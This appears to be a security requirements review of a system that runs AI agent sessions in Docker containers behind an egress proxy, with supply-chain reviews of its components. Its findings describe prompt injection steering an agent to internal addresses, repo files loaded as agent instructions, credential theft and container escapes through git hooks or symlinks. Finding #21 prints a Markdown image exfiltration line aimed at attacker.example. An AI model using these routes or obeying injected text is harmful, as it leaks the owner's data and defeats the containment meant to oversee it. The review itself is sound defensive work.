# F-007 Security Gate 1 (requirements review)

- **Feature:** F-007 Run spec interviews on the real engine, spec v11
- **Reviewer role:** security-reviewer, against `docs/security-standards.md`
- **Date:** 2026-11-11
- **Maturity level:** Rapid prototype. Only Critical findings block there
  (Severity table, "What blocks a PR").
- **Result:** 23 findings: 0 Critical, 7 High, 13 Medium, 3 Low. **Nothing
  blocks at Rapid prototype.** All seven High findings block at Alpha, so
  they should become requirements now, before the engine is written. Five
  need an owner decision (Security): #1, #4, #7, #19 and #20. The owner's
  decisions on OQ-1 to OQ-3 and OQ-5 to OQ-7 and OQ-9 are not re-opened; the
  findings cover the risks they leave.
- **S4.1 component reviews (OQ-4):** below. All four can be approved with
  the pins and conditions given. Some lookups failed; each review says which.
- **Threat model (S9.7):** below, STRIDE checked against the OWASP Top 10 for
  Agentic Applications.

| # | Criterion | Severity | Blocks? | Finding | Recommendation |
|---|---|---|---|---|---|
| 1 | S8.1, S8.4, S2.2, S9.4 | High | No | FR-8 says "egress only through the engine's proxy" but not how that is enforced. If the proxy is only set through `HTTPS_PROXY`, any process in the container can ignore it. On Docker's default bridge network a container reaches the internet directly, and also the host through `host.docker.internal`: the owner's local dev servers, the LAN, and Docker Desktop's TCP API if the owner has exposed it. That last one is a full escape to the host. The proxy is a Node process on the host, so the containers must be able to reach the host, which is exactly what has to be closed. | Add an SR. Agent containers join only a Docker `--internal` network with no route out. The proxy is the only thing on that network that has a second, outside network. A test from inside the container shows a direct connection to an outside address and to `host.docker.internal` both fail (extend AC-8). **Owner decision (Security):** where the proxy runs. Recommended: the owner's chosen proxy (our code, Node built-ins) runs in its own small sidecar container from the same pinned base image, on the internal network and one outside network. The alternative, a host process reached through `host.docker.internal`, needs per-OS firewall rules to stop containers reaching other host ports, and Docker Desktop doesn't give a portable way to do that. |
| 2 | S2.1, S8.1, S6.1 | High | No | One proxy serves both roles, but the analyst's `network` is empty and the web reader's is `"*"`. On Docker Desktop, connections from every container arrive through the same VM gateway, so the proxy can't tell the roles apart by source address. If it can't, the analyst gets the open web, which defeats F-005 SR-17 (open web never reaches an agent that sees project files). If the proxy listens on all host interfaces, anyone on the owner's network can use it as an open proxy, and with #4's gateway, use the owner's model credential. | Add an SR. Each container gets its own random proxy credential (`Proxy-Authorization`, in the proxy URL the engine passes in), bound to one session and role. The proxy applies that role's allow list, refuses a missing or unknown credential, and drops it when the session ends. It listens only on the internal network (or loopback), never on `0.0.0.0` on the host. The proxy log never records the credential. Add ACs: the analyst container can't reach a web host with the reader's credential missing, and a connection with no credential is refused. |
| 3 | S1.1, S8.4, S9.4 | High | No | The web reader's `"*"` goes through a proxy on the owner's machine. Prompt injection on a page can steer the reader to `https://192.168.1.1/`, `localhost`, `169.254.169.254`, `host.docker.internal` or a name that resolves to one of them (DNS rebinding). The reader's summary goes back to the analyst, then into the spec and search terms, so internal pages can leak out. Port 443 only narrows this. | Add an SR. The proxy resolves each host itself, refuses any resolved address that is loopback, private (RFC 1918), CGNAT, link-local, unique-local or IPv4-mapped forms of these, multicast, unspecified, or a Docker network address, and connects to the exact address it checked. It refuses IP literals for `"*"` roles. CONNECT only, port 443 only, as the owner decided. Add ACs for a private IP, `localhost`, and a name that resolves to `127.0.0.1`. |
| 4 | S3.1, S8.2, S9.4 | High | No | The model credential reaches the container (ADR 0015 accepts "the session's model token is inside the container"). Anything that runs there can read it from the environment: a hook from repo settings (#5), or code run through a Claude Code bug of the kind in its advisory history (component review 3). The allowed host `api.anthropic.com` also accepts any account's key, so code in the container can send project data to an attacker's own account through an allowed host. The proxy sees only host names, so it can't tell. | Add an SR. **Owner decision (Security):** how the credential reaches the session. Recommended: a credential gateway in the proxy (#1). The container gets `ANTHROPIC_BASE_URL` pointing at the proxy and a dummy key. The proxy adds the real credential, forwards only to `https://api.anthropic.com` on the API paths Claude Code uses, and drops any request that carries a credential of its own. The real credential never enters the agent container, and the exfiltration path through another account closes. Alternative: keep the ADR 0015 position and record the residual risk. I could not verify that a subscription token from `claude setup-token` works through a base-URL gateway; the implementation must test it, and fall back to the alternative with the owner's OK if it doesn't. |
| 5 | S6.1, S6.2, S8.1, S4.5 | High | No | The Agent SDK loads all filesystem settings by default: its 0.3.311 type docs say "When omitted, all sources are loaded (matches CLI defaults)". In the container the working folder is the project's worktree, so repo-controlled `.claude/settings.json` (hooks, which run commands), `CLAUDE.md`, `.mcp.json`, project skills and plugins would be loaded. That is repo text as instructions (S6.1), commands for roles with `commands: []`, and skills beyond "only the master factory's shared skills" (Role policy v2.2). The SDK package also ships a native Claude Code binary for the host platform, so a missing spawn setting would silently run the agent on the host, outside any container. F-006's Gate 2 note (a skill's `allowed-tools` must not widen a role) also lands here. | Add an SR fixing the session options. `settingSources: []`. `strictMcpConfig: true`, with only the engine's `factory` server. The tool list is exactly the role's tools plus its `mcp__factory__*` tools, as a hard list, not a default. Skills come only from the master factory version the manifest pins, baked into the image (a read-only mount would be a new mount, which is a widening under S8.5). The permission mode is never a bypass mode. Hooks are only the engine's own SDK callbacks. Every session uses the engine's container spawn; a session without it fails closed, and a test shows no `claude` process starts on the host. Inside the container set `DISABLE_AUTOUPDATER`, `DISABLE_TELEMETRY`, `DISABLE_ERROR_REPORTING` and `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`. The engine's own instructions come from `agents/<role>/AGENT.md`, not from the worktree. |
| 6 | S8.4, S1.3, S9.6, S5.1 | High | No | FR-11 has the engine commit the agent's change after each edit, on the host, as the owner. That is before the end-of-session write check (ADR 0015 decision 1). Git runs repo-configured code: a `core.hooksPath` into the worktree (husky sets `.husky/_`), `core.fsmonitor`, and clean or smudge filters. So a write to `.husky/pre-commit` from inside the container runs on the host, as the owner, at the next engine commit: a container escape. The per-call path check (FR-9) denies that write, but only if the CLI in the container is honest. Separately, `git push` run as the owner uses the owner's credential helper or SSH agent, which S9.6 forbids. | Add an SR. Every git command the engine runs uses fixed overrides: hooks off (`core.hooksPath` pointing at an empty folder the engine owns, and `--no-verify`), `core.fsmonitor=false`, no filters or textconv from the repo, `protocol.file.allow=never`, and no credential helper or SSH command. It pushes only over HTTPS with the factory token, passed by `GIT_ASKPASS` or a header on stdin, never in a URL or argument. Nothing else from the worktree runs on the host. Add an AC: a `.husky/pre-commit` written in the container doesn't run at the engine's commit. |
| 7 | S2.3, S6.2, S8.5 | High | No | The owner's GitHub id and the allow list now live in the manifest they guard (H-0080). Whoever can change that file can make their own account the one whose approval opens interviews, and then answer and approve assumptions as the owner. SR-5 says the engine refuses an unsigned owner change. But signed owner actions come in increment 3 (section 13), so SR-5 can't be met by this increment. The spec also doesn't say which copy the engine reads: the working tree, the local `main`, or the remote. A working tree can hold an unmerged edit, and any program running as the owner can change it. | Add an SR. The engine reads the manifest from the config repo's `main` commit, never from the working tree. Until signed owner actions exist, it pins the security keys (`owner.*`, `allowed_repo_owners`, `enabled`) when the owner first approves them, in an engine-only record outside every repo (beside the secrets in the OS credential store, #19). On any change to those keys it stops that project and files a Security item. The project runs again only after the owner confirms the change at an engine command and approves a device sign-in as the **previously** pinned owner id. Increment 3 replaces this with the signature check. **Owner decision (Security):** accept this pin-and-confirm rule for now (recommended), or keep SR-5 as written and leave owner-key changes unguarded until increment 3. Reword SR-5 to match. |
| 8 | S1.4, S6.1 | Medium | No | The engine reads files the agent wrote, on the host: the spec for `interview_spec_ready` (`spec_path` comes from the analyst), the readiness checks, and the secrets scan. The container can create a symlink, for example `docs/features/F-008-x.md` pointing to `~/.ssh/id_ed25519`. Inside the container that path points nowhere, but on the host it resolves to the owner's key, and the check's `evidence` or an error could return its content. A malicious repo can also commit such a link. | Add an SR. Every engine read of a worktree path uses the ADR 0015 real-path rule and refuses a path that leaves the worktree. `spec_path` must be the session's own `docs/features/F-nnn-*.md` (S1.4). The end-of-session check rejects any new or changed symlink (git mode 120000) in the session's diff, and the secrets scan reads blobs from git, not files through links. Add an AC with a symlinked spec. |
| 9 | S2.1, S1.4, S3.1 | Medium | No | `factory-projects.local.yaml` (H-0081) decides which config repos, and so which owner ids, the engine trusts. Anything that can write the master repo clone can add a path, including the owner's own Claude Code sessions, which run as the owner and read untrusted text. If the master repo itself were listed as a config repo, owner values would end up committed to the public master repo. The file names absolute home paths, so committing it by mistake leaks the owner's user name. | Add an SR. The engine refuses the file if it is a symlink, is not owned by the owner, or is group- or world-writable. It refuses a listed path that is not absolute, is a symlink, isn't a Git work tree, or is the master repo or a clone of it (by remote URL and root commit). A path it hasn't seen before is treated as a pinned-key change (#7): owner confirmation first. The master repo's CI fails if a file of that name is ever tracked, and if templates or fixtures hold anything other than placeholders. |
| 10 | S1.1, S1.4, S2.3, S5.1 | Medium | No | H-0082 has good limits on `text`, `why`, `options` and `findings`, but leaves gaps. (a) No limits on `research_web.query`, `findings[].text`, `findings[].source`, or `spec_version`. (b) `spec_path` is a path from an agent with no confinement (#8). (c) No cap on open assumptions, on items per session, or on `research_web` calls, so an injected analyst can flood the owner and drive approval fatigue (F-006 #8). (d) "Checked against the session's own feature" doesn't say where the feature comes from. (e) The owner-reply frame is plain text, so an owner who pastes text containing a line in the frame's format can make the analyst misread where a reply ends. | Amend H-0082 before approval. Limits: `query` up to 400 characters on one line, `source` an `https` URL up to 2,000 characters, `findings[].text` up to 2,000, and `spec_version` a non-negative integer. Ids match the channel's id pattern. Unknown keys are `invalid`. At most 5 open assumptions, 200 items, and a per-question and per-session cap on `research_web` (F-005 SR-15); over a cap returns a new `limit` error and tells the owner. The MCP server is built per session with its feature and project fixed. No tool takes a feature parameter, and `item` must belong to that feature. The frame wraps the owner's text with a random per-turn boundary, as MIME does, and states the text's length. |
| 11 | S2.1, S2.3 | Medium | No | One engine serves every enabled project (FR-1), but channel v1.3 has no project field. `feature.start` and `interview.open { feature }` don't say which project they mean. If two projects both have an F-008, an answer could land in the wrong project's transcript and be pushed to its repo. Each project also has its own owner id and OAuth client id. | Add an SR. Feature ids are unique across the engine's projects, or the engine refuses an ambiguous id. The session token, device approval (that project's `owner.github_id` and `oauth_client_id`), containers, cache volumes, proxy credentials and image are all per project and never shared. Raise the missing project parameter as an Interfaces question for the channel; don't change the contract silently. |
| 12 | S2.1, S6.2 | Medium | No | `factory/state` is not protected (ADR 0009). The transcript is the evidence for readiness check 5 (every approved assumption has an `approve_assumption` entry). Anyone with push access, or a process using the factory token, can add a forged entry, and the check passes. Section 6 lists "`factory/state` has commits the engine didn't make" but gives no behavior. | Add an SR. The engine keeps a hash chain over the transcript entries it writes and stores the chain head in its own record (#7). On fetch it refuses transcript changes that don't extend its chain, files a Security item, and fails the readiness checks for that feature. Commits to other paths by other writers are shown to the owner. Increment 3's signature check replaces this for owner actions. |
| 13 | S2.1, S5.1, S4.5 | Medium | No | The channel's peer and ACL checks (OQ-3, koffi) depend on things Node doesn't expose. On Unix, reading `SO_PEERCRED` or `getpeereid` needs the socket's file descriptor, which Node only has on an undocumented internal handle. On Windows, Node creates the pipe, so the owner-only ACL has to be applied to a pipe Node made, or the engine has to make the pipe itself. The default named-pipe DACL gives Everyone read access. A wrong struct size or offset in an FFI declaration can read the wrong uid and accept any peer, or corrupt memory in the process that holds the secrets. | Add an SR. Every FFI step fails closed: no descriptor, an error code, or an unexpected size means the connection is refused, or the engine doesn't start. After creating the pipe or socket, the engine reads its ACL or mode back and refuses to serve unless only the owner has access. The FFI layer is one small module with a fixed list of OS functions and no library names from config. CI on Windows, macOS and Linux runs negative tests: another user's peer, a pipe with a wider ACL, and a forced FFI error. |
| 14 | S1.3, S8.4, S8.5 | Medium | No | Driving `docker` through the CLI (OQ-5) brings its own risks. The `docker` found on `PATH`, `DOCKER_HOST` and `DOCKER_CONTEXT` come from the owner's environment, and a project's `.envrc` can set them, so a remote daemon could receive the worktree mount and the session's secrets. Arguments built from strings risk injection. Flags that fail quietly (for example on an older runtime) leave a weaker container. On Linux, access to the Docker socket (the `docker` group) is root-equivalent, which goes against S8.4 unless it is stated. | Add an SR. Run `docker` by absolute path, with an argument array and no shell. Use a fixed local context, and clear `DOCKER_HOST`, `DOCKER_CONTEXT`, `DOCKER_CONFIG` and `DOCKER_TLS*` from its environment. Container names come from validated ids only; no agent or owner text goes into an argument. After each start, `docker inspect` must confirm: image digest, user, read-only root, all capabilities dropped, `no-new-privileges`, CPU, memory and pids limits, the network, and exactly the expected mounts; otherwise stop the container and fail closed (SR-2). State in the spec that the engine needs the Docker daemon, which is root-equivalent on Linux without rootless mode, with the reason (S8.5). Recommend rootless Docker or Docker Desktop on Linux. |
| 15 | S3.2, S3.3, S3.1 | Medium | No | Section 9 names no sensitive data (S3.2). This increment creates several kinds: the model credential, the factory token, the device-flow token and `device_code`, interview session tokens, proxy credentials (#2), owner answers, transcripts, Claude Code session files kept for resume (FR-14; by default `~/.claude/projects` inside the container, holding the whole conversation including web content), proxy and engine logs, and local paths. `factory/state` is pushed, so if a project's repo is public, the owner's answers are public. | Add to section 9 the list above and how each is handled. Session files go in a per-session volume, never in the worktree or the owner's home. They are mounted only into that session's resumed container and deleted when the run ends. Logs go in an owner-only folder (0700, files 0600) outside every repo. They never hold tokens, credentials, `device_code`, proxy credentials or reply text, and are kept for a fixed time. At start, the engine warns the owner when a project's repo is public. |
| 16 | S9.1, S9.4, S8.2, S8.5 | Medium | No | The spec doesn't list its external services and whether each only reads or also acts (S9.1). Nor does it state the factory token's scope and lifetime (S8.2), or what data leaves for the model API (S9.4). | Add to section 9. **GitHub:** device flow (`github.com/login/device/code`, `/login/oauth/access_token`) and `GET /user`: read. `GET /repos/{owner}/{repo}` with the factory token: read. Pushes of `feature/*` and `factory/state`: act, granted by ADR 0005, 0006 and 0009. **Anthropic API:** act; sends role prompts, project files the role reads, owner answers, and web summaries. **Web:** read, through the reader only. The **npm registry and Docker Hub** are used only when the image is built, never from a session. Factory token: a fine-grained token (or GitHub App) limited to the project's repos, `contents: write` and `metadata: read`, with an expiry. It never enters a container. |
| 17 | S5.1, S1.1 | Medium | No | Budgets come in increment 5, but this increment runs real model sessions. Nothing caps a session's turns, tokens or wall time, or a container's CPU, memory and process count (the Role policy asks for limits but gives no values). FR-14 resumes an interrupted run without counting a retry, so input that crashes the engine or the container could resume forever. | Add an SR. Every session has fixed caps on turns, output tokens or dollars (the SDK's budget option where available), and wall time. Every container has CPU, memory and pids limits, and its temp folder has a size cap. All values are in change-controlled config. A run that hits a cap stops and reports. At most 3 resumes per run, after which it is marked `failed` and the owner is told. The billing-mode check (FR-3) runs again before each session, not only at start. |
| 18 | S4.1, S4.4, S8.3 | Medium | No | Constraint 5 requires CVE checks in CI, but no tool scans the image, and the factory's npm audit is `--audit-level=high` (F-003 R2-7). FR-11's secrets scan is not named; if it is an outside tool such as gitleaks, it needs its own S4.1 review. The base image ships npm 11.20.0 with bundled packages that have advisories: `undici` 6.28.0 (several High, including a TLS validation bypass, fixed in 6.29.1) and `brace-expansion` 5.0.9 (High DoS). Neither analyst nor reader needs npm at run time. | Add an SR. CI scans the built image and the engine's lockfile on every change: OSV-Scanner, already reviewed for F-003, in its image mode, re-reviewed for that mode (S9.5). Name the secrets scanner in the spec, with its own S4.1 review if it is external. Build the agent image in stages and leave npm and npx out of the final image. The engine's CI job declares `permissions: contents: read` and uses no secrets (S8.3). |
| 19 | S3.1, S8.2 | Medium | No | The OS credential store (OQ-7) protects the secrets from disk theft and accidental commits, but not from other programs running as the owner. Windows Credential Manager and Linux Secret Service give any process of the user the stored items. On macOS the item's access list will trust the `node` binary, so any Node script trusts it too. Any npm install script the owner runs in any project can read the factory token and the model credential without a prompt. | Record this as a residual risk, narrowed by the scope and expiry in #16, and a spending limit on an API key. Store items under a factory-specific service name. On macOS, set the item's access list to the engine's launcher, not `node`, if the implementation can. **Owner decision (Security):** accept this residual risk (recommended), or require an extra unlock (an OS prompt) each time the engine starts. |
| 20 | S6.1, S8.1 | Medium | No | Role policy v2.2 says the engine strips hidden content (comments, scripts, hidden elements, zero-width and bidi characters) before the web reader sees a page. FR-8 and FR-9 give the reader exactly its policy tools, `WebFetch` and `WebSearch`. Claude Code's built-in `WebFetch` fetches and processes the page inside the CLI, so the engine never sees the page to strip it. The approved contract can't be met as the spec stands. | **Owner decision (Security):** recommended, replace the reader's built-in `WebFetch` with an engine tool (`factory` MCP `fetch_page`) that fetches through the proxy, with #3's address rules applied, strips hidden content, caps the size, and returns plain text with the source address. That is a Role policy change (Interfaces, Security), through its own hygiene item. The alternative is to amend the contract to say stripping isn't done for now, and record the risk. `WebSearch` runs on Anthropic's side; the engine logs its queries from the SDK's message stream, since the proxy sees only host names. |
| 21 | S1.2, S6.1 | Low | No | Analyst text (questions, findings, sources) comes partly from web content and goes into the transcript and the spec, both pushed to GitHub. If either renders as Markdown, an image link like `![](https://attacker.example/?d=...)` makes the viewer's browser fetch the attacker's URL (GitHub fetches it through its image proxy), which carries data out. This is the same class as F-006 #2. | The engine stores transcript text as data (JSON strings, or fenced so the fence can't be closed from inside), never as live Markdown. The readiness check flags remote images and raw HTML in the spec for the owner. |
| 22 | S4.3, S4.1 | Low | No | The pins below need conditions the spec doesn't state. The SDK and the CLI must match: SDK 0.3.311's `manifest.json` names Claude Code 2.1.311, with a SHA-256 for each platform's binary. koffi's install script rebuilds from source with CMake if the prebuilt binary doesn't load. Claude Code's `postinstall` copies the platform binary over a stub. | Add to constraints. Commit a lockfile with integrity hashes, and install with `npm ci --ignore-scripts` on the host (koffi 3.x loads its `@koromix/koffi-<platform>` prebuild without the script). Run Claude Code's `postinstall` only in the image's build stage, and check the binary's SHA-256 against the SDK manifest. Upgrade the SDK and CLI only together. Treat each version bump as a new S4.1 check of its advisories and changelog (S9.5). |
| 23 | S1.1, S3.3 | Low | No | The device flow sets rules for the client (ADR 0014; channel v1.2) but not for what the engine accepts from GitHub. A wrong `interval`, an unbounded `expires_in`, or a missed `slow_down` could make the engine poll in a loop or accept codes for too long. | Add to FR-7. Validate every GitHub field (code formats, `verification_uri` exactly `https://github.com/login/device`, `expires_in` at most 900 s, honour `interval` and `slow_down`). Use default TLS checks. Never log `device_code` or the token. Compare the numeric id, never the login. |

**Already covered by the spec or earlier decisions:** fail closed on every
check (SR-2, S5.1). No owner credentials, socket or `engine.json` in
containers, non-root, read-only root, no capabilities (FR-8, ADR 0015, Role
policy). End-of-session write check (FR-9). Device approval with id check,
token discarded, 30-minute and 2-hour limits (FR-7, ADR 0014). The analyst
reaches the owner only through engine tools, which never answer for the
owner (FR-10). Engine-only, append-only transcript with a secrets scan
before commit (FR-11, F-005 SR-11). Credential/billing-mode check (FR-3).
Advisor kinds refused (FR-4). Allow-list check by repo owner id from GitHub,
not URL text (H-0080). Nothing owner-specific committed to the master repo
(section 10).

**Comments on the drafted SRs:** SR-1 should also cover `device_code`,
session tokens and proxy credentials. SR-2 should add proxy address rules
(#3) and the post-start `docker inspect` check (#14). SR-3 is right; add
that tool arguments are validated against H-0082's limits before use. SR-4
should also log the proxy's per-connection record (session, role, host,
port, time, bytes). SR-5 can't be met in this increment (#7).

**Abuse cases to add to edge cases:** a process in the container ignoring
`HTTPS_PROXY`, or reaching `host.docker.internal` (#1). The analyst using
the web reader's allow list (#2). A page steering the reader to a LAN
address or a rebinding name (#3). Code in the container reading the model
credential, or sending data to another account's API key (#4). A repo's
`.claude/settings.json` hook or `CLAUDE.md` loaded into an agent (#5). A
written `.husky/pre-commit` running at the engine's commit (#6). A manifest
edit that swaps `owner.github_id` (#7). A symlinked spec pointing at
`~/.ssh` (#8). A new path added to `factory-projects.local.yaml` (#9). An
assumption flood, or a 1 MB search query (#10). The same feature id in two
projects (#11). A forged `approve_assumption` entry pushed to
`factory/state` (#12). A peer of another user, or a pipe with a wider ACL
(#13). `DOCKER_HOST` set by a project's `.envrc` (#14). A crash loop on
resume (#17). A tracking image in the transcript (#21).

**Proposed security requirements for section 9:**

| Id | Requirement | From |
|---|---|---|
| SR-6 | Agent containers sit on an internal network; the proxy is their only way out; direct and host connections fail. | #1 |
| SR-7 | Per-session proxy credentials select the role's allow list. The proxy listens only on the internal network. | #2 |
| SR-8 | The proxy refuses private, loopback, link-local, metadata and Docker addresses after its own DNS lookup, and connects to the address it checked. | #3 |
| SR-9 | The model credential reaches the API through the proxy's gateway and never enters an agent container (subject to the owner's decision). | #4 |
| SR-10 | Fixed SDK session options: no filesystem settings, strict MCP, exact tool list, factory-pinned skills baked into the image, container spawn required, no auto-update or telemetry. | #5 |
| SR-11 | Engine git commands run with hooks, fsmonitor and filters off, no credential helper, and push only with the factory token. | #6 |
| SR-12 | The manifest is read from `main`. Security keys are pinned and need owner confirmation plus a device approval by the pinned owner to change, until signed actions exist. | #7 |
| SR-13 | Engine reads of worktree paths use the real-path rule. `spec_path` is confined. New symlinks reject the session. | #8 |
| SR-14 | The project path list is checked for owner, mode and symlinks. The master repo can't be a config repo. New paths need confirmation. CI blocks the file being tracked. | #9 |
| SR-15 | H-0082 limits, caps, feature binding and a delimited owner-reply frame. | #10 |
| SR-16 | Feature ids, sessions, approvals, containers, caches and proxy credentials are all per project. | #11 |
| SR-17 | The engine hash-chains its transcript entries and refuses changes it didn't make. | #12 |
| SR-18 | FFI peer and ACL checks fail closed, the ACL is read back after creation, and there are negative tests on all three OSes. | #13 |
| SR-19 | `docker` runs by absolute path, with an argument array and a fixed local context. Every container's settings are checked with `docker inspect` after start. | #14 |
| SR-20 | Sensitive data is listed. Session files live in a per-session volume. Logs are owner-only and hold no secrets. A public repo triggers a warning. | #15 |
| SR-21 | External services and their read or act scope are listed. The factory token is scoped and expires and never enters a container. | #16 |
| SR-22 | Per-session and per-container caps. At most 3 resumes. The billing-mode check runs before each session. | #17 |
| SR-23 | CI scans the image and lockfile. The secrets scanner is named and reviewed. npm is left out of the agent image. | #18 |
| SR-24 | The credential store's residual risk is recorded, and the stored tokens are tightly scoped. | #19 |
| SR-25 | The web reader fetches through an engine tool that strips hidden content (subject to the owner's decision). | #20 |
| SR-26 | Transcript text is stored as data, never live Markdown. | #21 |
| SR-27 | Lockfile, `--ignore-scripts` on the host, CLI binary checksum checked in the image, SDK and CLI upgraded together. | #22 |
| SR-28 | Device-flow responses are validated, and their secrets are never logged. | #23 |

**Permissions this feature adds (S8.5):** the engine gets the Docker daemon,
which is root-equivalent on Linux (#14). It gets outbound HTTPS to GitHub and
the model API, and through the proxy, the web for the reader (#16). It reads
and writes the OS credential store (#19), uses FFI into OS libraries (#13),
and pushes with the factory token (#6, #16). Each agent session gets one
container with its worktree, its caches and, for resume, a session volume
(#15). The analyst and reader get the `factory` MCP tools (H-0082), and with
#20 the reader gets `fetch_page`. Each of these should be stated in the spec
with its reason.

**Items needing an owner Security decision:**
- **#1:** Where the egress proxy runs. Recommended: a sidecar container on
  an internal network, running our own Node proxy code.
- **#4:** How the model credential reaches a session. Recommended: a
  credential gateway in the proxy, so it never enters an agent container.
- **#7:** How owner-key changes are guarded before signed owner actions
  exist. Recommended: pin the keys and require an owner confirmation plus a
  device approval by the previously pinned owner.
- **#19:** The OS credential store's same-user exposure. Recommended: accept
  and record it, with scoped, expiring tokens.
- **#20:** How the web reader's stripping rule is met. Recommended: an
  engine `fetch_page` tool replacing the built-in `WebFetch`, through a
  Role policy hygiene item.

**Not applicable:** S6.3 (no agent in this increment writes change-controlled
files; the contract and `.gitignore` changes go through H-0080 to H-0082).
S9.2 (no new irreversible or visible action beyond branch and `factory/state`
pushes, which ADR 0005, 0006 and 0009 grant).

## S4.1 component reviews (OQ-4)

Checked on 2026-11-11 from this session. **Sources that worked:** the npm
registry (package metadata and tarballs), the npm advisory database (bulk
endpoint, GitHub-reviewed advisories), Docker Hub and its registry (tags,
digests, image config, SBOM attestation), and `nodejs.org/dist/index.json`.
**Lookups that failed:** OSV (`api.osv.dev`, refused by this session's
proxy), the GitHub global advisory API (refused: this session is bound to
its own repositories), and the Debian security tracker (refused by the
proxy). No image scanner was available, so **the Debian packages in the base
image were not CVE-checked.** That has to be done before approval, or in the
first CI run under #18. No component was run.

### 1. koffi

| Item | Finding |
|---|---|
| Source and maintainers | `github.com/Koromix/koffi` (per package metadata), MIT license. **One npm maintainer** (`koromix`), who publishes by hand: 290 versions since February 2022, eight in the last eight weeks. No npm provenance attestations. One account is the whole supply chain. |
| Known CVEs | None in the npm advisory database for the versions checked (0.9.0, 1.0.0, 2.0.0, 2.5.0, 3.3.4, 3.3.7). The changelog shows memory-safety bug fixes in normal releases, for example 3.3.5 "Fix countedBy confusion for similar array types" and 3.3.3 "Fix stack alloc mismatch regression introduced in 3.3.2". |
| Install scripts | `install`: `node ./cnoke.cjs ... --prebuild`. It checks whether the prebuilt binary from `@koromix/koffi-<platform>` loads. If not, it **builds from source with CMake** (and ninja or ccache if present), compiling native code on the owner's machine. The 3.x loader finds the platform package itself, so `--ignore-scripts` is enough. |
| Permissions it needs | Runs native code in the engine process: any address, any OS call. This is by design, and it is why the declarations must be minimal and tested (#13). Used only in the engine on the host, never in containers. |
| What it pulls in | No dependencies. Twenty optional platform packages `@koromix/koffi-*` (prebuilt `.node` binaries, about 2.4 MB each), same maintainer. |
| Verdict | **Approve, with conditions:** exact pin and lockfile, `--ignore-scripts`, a single FFI module (#13), and each upgrade reviewed from the changelog. |
| Proposed pin | **`koffi@3.3.6`** (2026-10-31) and the matching `@koromix/koffi-*@3.3.6`. It includes 3.3.5's memory and array-type fixes and 3.3.6's crash fix. It leaves out 3.3.7 (2026-11-05), which changes allocator behavior and the macOS build toolchain and is six days old. |

### 2. `@anthropic-ai/claude-agent-sdk`

| Item | Finding |
|---|---|
| Source and maintainers | Anthropic. Fifteen npm maintainers, all Anthropic accounts. Published by the `GitHub Actions` npm user, with registry signatures but no provenance attestation. Repository `anthropics/claude-agent-sdk-typescript`. Proprietary license (Anthropic legal agreements). Version 0.x, released almost daily, so breaking changes are possible. |
| Known CVEs | None in the npm advisory database for 0.0.1, 0.1.0, 0.3.311 or 0.3.322. Its peers have some: `zod` < 4.6.6 (High, memory exhaustion on oversized constrained collections; H-0082's array limits are this code path), and `@modelcontextprotocol/sdk` < 1.32.0 (several High, mostly the HTTP transports and OAuth, which the in-process server doesn't use). |
| Install scripts | None. |
| Permissions it needs | Spawns the Claude Code process and passes it the environment and the credential. Runs hook and `canUseTool` callbacks and in-process MCP servers inside the engine. Parses the CLI's message stream in the engine, and that stream is untrusted when the CLI runs in a container (S4.5). Loads all filesystem settings unless told otherwise (#5). Supports `spawnClaudeCodeProcess` for running the CLI in a container. |
| What it pulls in | No dependencies. Peers `zod ^4.0.0`, `@anthropic-ai/sdk >=0.93.0`, `@modelcontextprotocol/sdk ^1.29.0`. One optional platform package of about 294 MB holding the **native Claude Code binary**. `manifest.json` pins it to Claude Code 2.1.311 with a SHA-256 per platform (linux-x64 `86dc1fcc…8ada`, linux-arm64 `2e2496c9…61f3`). |
| Verdict | **Approve, with conditions:** #5's fixed options, container spawn required, peers pinned to fixed versions, and the SDK upgraded only together with the CLI. |
| Proposed pin | **`@anthropic-ai/claude-agent-sdk@0.3.311`** (2026-10-26, released alongside CLI 2.1.311, the CLI's current `stable` tag). Peers: **`zod@4.6.7`**, **`@modelcontextprotocol/sdk@1.32.2`** (no advisories for either). `@anthropic-ai/sdk`: **not verified.** The peer range is wide, and I couldn't confirm which version the SDK is tested with. 1.3.0 and 0.93.0 have no advisories. Choose at implementation and record it with the decision. |

### 3. Claude Code (`@anthropic-ai/claude-code`, in the agent image)

| Item | Finding |
|---|---|
| Source and maintainers | Anthropic, the same fifteen maintainers, published from CI. The npm package is a small wrapper. The program is a closed-source native binary of about 290 MB from `@anthropic-ai/claude-code-<platform>`. Proprietary license. |
| Known CVEs | 26 advisories in the npm advisory database across its history, 21 of them High. They include permission-prompt bypasses, code execution before the trust dialog, repo-controlled settings, sandbox escape through symlinks, and a TOCTOU race in the Edit tool that allowed writes outside the workspace. All are fixed at or before 2.1.251; **none affects 2.1.311 or 2.1.322.** The pattern matters: Claude Code's own permission system is not the security boundary. The container, the proxy and the engine's end-of-session check are (ADR 0015). |
| Install scripts | `postinstall`: `node install.cjs` hard-links or copies the platform binary over the `bin/claude.exe` stub, then `chmod 755`. `prepare` only guards publishing. Run it only in the image build stage. |
| Permissions it needs | Network to the model API, plus telemetry, error reporting and auto-update hosts unless turned off (#5). Writes session files under its config folder (#15). Reads its working folder. Runs its tools, including any hooks and MCP servers its settings name (#5). |
| What it pulls in | No dependencies. Eight optional platform packages, each with the native binary. |
| Verdict | **Approve, with conditions:** pinned in lockstep with the SDK, binary SHA-256 checked against the SDK manifest at image build, auto-update and nonessential traffic off, settings isolation (#5), and runs only inside the container. |
| Proposed pin | **`@anthropic-ai/claude-code@2.1.311`** (2026-10-26, the `stable` dist-tag). |

### 4. Docker's official `node` LTS image, Debian slim

| Item | Finding |
|---|---|
| Source and maintainers | Docker Official Image `library/node`, maintained by the Node.js Docker team and reviewed through Docker's official-images process. Rebuilt often; tags move. Each image index carries an SPDX SBOM and a SLSA provenance attestation. |
| Version | The current LTS line is **Node 26** ("Lithium", LTS from 26.13.0 on 2026-10-28). 26.13.0 includes the 26.12.1 security release. `lts-slim` points at `26.13.0-trixie-slim` (Debian 13). |
| Known CVEs | **Node:** none known for 26.13.0 at review time (the release index shows 26.12.1 as the last security release, before it). **Debian packages (113, including openssl 3.5.7-1~deb13u3, libc6 2.41-12+deb13u4):** **not checked**, because the tracker and OSV were unreachable and no scanner was available. **Bundled npm 11.20.0 (144 npm packages):** advisories in `undici` 6.28.0 (High, including a TLS validation bypass; fixed in 6.29.1), `brace-expansion` 5.0.9 (High DoS), and Moderate ones in `glob` 13.0.6, `minimatch` 10.2.5, `ip-address` 10.5.0 and `postcss-selector-parser` 7.1.4. These run only when npm runs; remove npm from the final image (#18). |
